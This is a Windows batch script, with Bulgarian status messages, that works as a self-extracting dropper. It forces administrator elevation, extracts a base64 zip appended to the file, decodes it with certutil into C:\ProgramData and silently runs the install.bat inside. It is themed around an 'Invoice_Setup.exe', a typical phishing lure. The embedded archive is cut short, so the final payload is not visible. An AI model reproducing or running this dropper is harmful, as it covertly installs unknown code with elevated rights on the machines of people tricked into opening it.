@echo off
chcp 65001 >nul
cd /d "%~dp0"

set "TARGET_DIR=C:\ProgramData\MySystemSetup"
set "EXE_NAME=Invoice_Setup.exe"
set "LOG_FILE=%TARGET_DIR%\install_log.txt"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo =================================================== >> "%LOG_FILE%"
echo [+] Начало на напълно скрита тиха инсталация: %date% %time% >> "%LOG_FILE%"

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Изискват се администраторски права. Пренасочване... >> "%LOG_FILE%"
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit
)

set "TEMP_B64=%TEMP%\temp_b64.txt"
set "TEMP_ZIP=%TEMP%\temp_archive.zip"

echo Сглобяване на инсталационните файлове, моля изчакайте...

if exist "%TEMP_B64%" del /F /Q "%TEMP_B64%" >nul 2>&1

:: Извличане на Base64 кода директно от файла без тежки за паметта скоби
powershell -Command "$lines = Get-Content '%~f0'; $start = 0; for($i=0; $i -lt $lines.Count; $i++){ if($lines[$i].StartsWith('UEsDB')){ $start = $i; break; } }; $code = $lines[$start] -trim; [System.IO.File]::WriteAllText('%TEMP_B64%', $code)"

certutil -decode "%TEMP_B64%" "%TEMP_ZIP%" >nul
powershell -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%TARGET_DIR%' -Force" >nul
del "%TEMP_B64%"
del "%TEMP_ZIP%"

cd /d "%TARGET_DIR%"

if exist "install.bat" (
    echo [+] Файлът е извлечен успешно. Стартиране на вътрешния скрипт... >> "%LOG_FILE%"
    call "install.bat"
    echo [+] Вътрешният скрипт приключи работа. >> "%LOG_FILE%"
) else (
    echo [!] ГРЕШКА: Вътрешният инсталационен скрипт не беше намерен след разархивиране! >> "%LOG_FILE%"
)

echo =================================================== >> "%LOG_FILE%"
exit

UEsDBBQACAAIAHu8SV0AAAAAAAAAAAAAAAALACAAaW5zdGFsbC5iYXR1eAsAAQQAAAAABAAAAABVVA0ABypQyWqXkdpql5Haaq1XXU8bRxR9t+T/cGPJ+VCDF9ImrZBApWDAagzUJm1QnFqWPYCFvevsrhOQqoqPtLR5KJQ2ahQpaRr1oY8OxbWL+fgLs/8o587u2osNCYliybve2Zk755577p3rz0V+0SBjfj4cyi/mK3Tjen//AA3r1VI4FA4NDpL8Xdadh7IpD2XTWZU13OuES42cNYz+62xg1H901px1WZcHakAeY/ax3Je1cMgSNkVmR1IT8dnsWCI1NDqYmTGNBTNXHsvZuUxyJb1i2aKcFna1EvGmx2/Hs1MjyfhQQr9vFPMia/HbmFgW/oyb0xPZ8cTN+FC0YzqaKeqWnSuVsiVjIWYv2xHPkYEYyb+cR7Ih94Br94QnPwJ0C1+MwoEg9KuEX/vyiNRs+PfI+RmEsJ+7zgYvCIeK86QbNonlogVQQSwRKi8VimbXIANStA+9+4eGh2HNd5xtKUt3PrpL8hnQbwJuy4VbUxd5DJ9b+HXEEdpHsJrKRVyazg88CaFV/vDCGqhoOluDFC3kbBGlqF0s49azqWL0Ghj9EwaPQEMd93221uBLDRwfeJqBadYNNjhyVhmCbIJfJSXFno5IWsKyioaudEfXhi8OKFKjwjQNsyTui1KUdHGP+ulyOET4uD5fgM+/yRfysfxHPpXb0OozZwv7vhMAVoVLC8bWEd515unYFXus13O1/XLRDoeu+BnCvK/B+GZHVfsg/YAgkVWVDnWMHvZoyw3SN0W9YDywrrqL9sAkgPJoaiRFCuUr2Ea0gvE7QroWSCsA3PeFSr8fkTvA8lzuyOd36eMYp+4RFsNN0NIWOxxtYPeW8wsA1xVDW0Dq46AxMS/0gjC9UHbQzsaTM8Qwzs4Wl4+XeGwwycgbDgf22ONpuzzqxudYycYlpoVB31SUN4mqXQBqr4OfESoya56YO9zip4=
